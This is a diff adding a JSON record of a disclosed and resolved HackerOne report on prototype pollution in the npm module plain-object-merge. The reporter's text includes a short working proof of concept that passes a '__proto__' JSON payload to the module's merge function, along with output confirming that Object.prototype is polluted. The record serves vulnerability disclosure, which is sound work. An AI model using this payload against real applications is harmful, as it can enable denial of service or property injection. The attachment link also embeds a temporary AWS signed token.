@@ -1,0 +1,125 @@
+{
+  "id": 871156,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzExNTY=",
+  "url": "https://hackerone.com/reports/871156",
+  "title": "[plain-object-merge] Prototype pollution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-11T22:23:34.390Z",
+  "submitted_at": "2020-05-11T22:23:34.390Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-03-13T19:30:53.402Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-02-11T19:30:38.475Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `prototype pollution` vulnerability in `plain-object-merge` module.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** `plain-object-merge`\n**version:** `1.0.1`\n**npm page:** `https://www.npmjs.com/package/plain-object-merge`\n\n## Module Description\n\nExtremely fast function optimized for deep merging json-serializable plain objects.\n\n## Module Stats\n\n[20] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `plain-object-merge` module:\n    - `npm i plain-object-merge`\n\nCreate an object with `__proto__` property and pass it to the `merge` function:\n```javascript\n\nconst merge = require('plain-object-merge');\nconst payload =  JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\nconst obj = {};\nconsole.log(\"Before : \" + obj.polluted);\nmerge([{}, payload]);\nconsole.log(\"After : \" + obj.polluted);\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F824411}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.",
+  "weakness": {
+    "id": 106,
+    "name": "Modification of Assumed-Immutable Data (MAID)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 824411,
+      "file_name": "plain-object-merge_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yhGE6L4Sy6bY3r6o2wqrCJHX?response-content-disposition=attachment%3B%20filename%3D%22plain-object-merge_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27plain-object-merge_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5KRIUIB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIEHV8zCFLyJB6KIJX9tB1RS3FI0Drzztv4FJrx6gYAMmAiEA%2FEgkng1Z3j8HVZ%2F5aHGm4OkJU9HZRWZMcIiKfHC1NXwqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLuToQaaRyrazCg1XiqOBfza%2B59IoaeU2wLPK3q%2BMcz%2FnrJyz3yNpBfjxjHZEku1YzbN6WwLtZ0mndnVNwGw6hQFtwEnQpv2ppYD%2F0X2KRZP1Fu0UYCFK4Q27b4qlWIylC%2Fbhsdsu0bdzppqokEh%2FFXmE47HH%2FTXVlXbDuRRI53nOymMuQPE28fWjHgvGkJptUNGGutap74gl1%2B8mKqO9e%2BYMUTgaEPu%2FrHqtyj%2B%2BfNS67VxeBNMTblj2HEhbY9ktTNc1nRY6Z0PeWs%2BQk%2BIImJTkPtWJQnXohmMjIBdhMe%2BemGdMDG4T%2FJzcqvFjjWZLyI0445CtGroL25RL8dz2mm8In00t9aUDywnrYM2p4BRpcgyK1xtTlf4PP8WJfBzxIuoFeSTnZs1Xg7rxqTSw%2Bb88hclyBCq8%2FDjdryxsVSTZSrWXAE4WS3L0Cc1Hk8GenLA4PkQN61UpOrCFQDaTJeqV63TV1pIBmAhfCRORzoKohxp1aUbhgvhfHZhKi1%2B%2F%2BqbvClz3%2F95uIFQje2HawIRTm0%2Fwe9RhSAVOGug33glWSmlAPWOJxvuyTtSSUBoqFy0cu%2BCXM8XqbdBqDiafTYJtil%2Bwn%2BoLFXGI7p8ls1hpTAFmHOOn0yV%2FKzg%2Fk5x%2BYerSXNrq7gjwx%2FVxS7%2FsYVSWELq833psEY7FFgTZjqhghQEE5CnoR2QwzB6%2Fq1CPI2P46OhmnlaegadV6XTBjJRsiLer59jGw7iO9okW3Vtb9Q54KjXih9%2BphmJy2kayQ75K%2BJYSkYUuPynuH8soQ8XFGc46vlti85HRICdiOl%2Ft55ZL%2FdOq1LFJXQXHdWQ5jiirR2%2BahP5z146NaV6BqA5IrZOlAQ88raRikpdof%2BLk8zQt83nE2RY%2FBWUfjDQkP3PBjqxAawKMjCvVekDkhDpOPsN6jVcVAs4TRnjOLDlscpEybQrOgJ0Oc7WllK14qGzOUzdQBmDc4vKdW3T%2F%2FRlQkjtMTew2Vzgli82a3myGHp0cLQbXaZU0rrB%2BSb8uLG%2Fdf0CW4nDrhFadGREJk3xXcpHt5KZQ0ODQw45jzZQ4tuVly4L6uXe7lSLwGyIbN6qN2AOaE0cGB2cPDi2FtJJEdlmuvopgBAuhBEK7d2DLNck4XkZ2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d441bed3c35689540324dbf4cc31b0f04d4ed26260345c8909ad11d6f763fc08",
+      "file_size": 300729,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-03-13T19:30:38.604Z",
+  "allow_singular_disclosure_after": -162675899.25481895,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "salahhasoneh",
+    "dr4f3rt"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
